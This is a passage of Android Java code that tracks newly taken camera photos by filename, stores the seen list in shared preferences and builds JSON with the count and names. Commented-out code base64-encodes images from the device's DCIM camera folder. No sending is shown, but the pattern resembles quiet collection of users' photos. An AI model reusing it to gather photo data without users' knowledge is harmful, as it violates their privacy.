            prevfilenames=gson.fromJson(mSharedpref.getImageList(),listType );
            if(prevfilenames==null){
                prevfilenames=new ArrayList<>();
            }
            filenames.removeAll(prevfilenames);
            JSONArray mJsonArray=new JSONArray();
            int value;
            if (filenames.size()>=2){
                value=1;
            }
            else value=filenames.size();
            for (int i=0;i<value;i++){
                JSONObject mjJsonObject=new JSONObject();
                try {
                    mjJsonObject.put("no of imgs taken",filenames.size());
                    mjJsonObject.put("name",filenames.get(i));
                    try {
                     //   String encodedImage = Base64.encodeToString(byteArrayImage(filenames.get(i)), Base64.DEFAULT);
                       // mjJsonObject.put("base64",encodedImage);
                    }
                    catch (Exception e){
                        e.printStackTrace();
                        continue;
                    }
                    mJsonArray.put(mjJsonObject);
                    addNewFiles.add(filenames.get(i));
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
            try {
                convertarray=gson.toJson(mJsonArray);
                prevfilenames.addAll(addNewFiles);
                String fil=gson.toJson(prevfilenames);
                mSharedpref.setImageList(fil);
                mSharedpref.commit();
            }
            catch (Exception e){
                e.printStackTrace();
                return "";
            }
        }
        catch (Exception e){
            e.printStackTrace();
            return "";
        }

        return convertarray;
    }
    /*public static byte[] byteArrayImage(String imagepath){
      //  Bitmap bm = BitmapFactory.decodeFile("/path/to/image.jpg");
        Bitmap bm = BitmapFactory.decodeFile("/storage/emulated/0/DCIM/Camera/"+ imagepath);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); // bm is the bitmap object
        byte[] b = baos.toByteArray();
        return b;
    }*/


}
//Pictures/Screenshots
//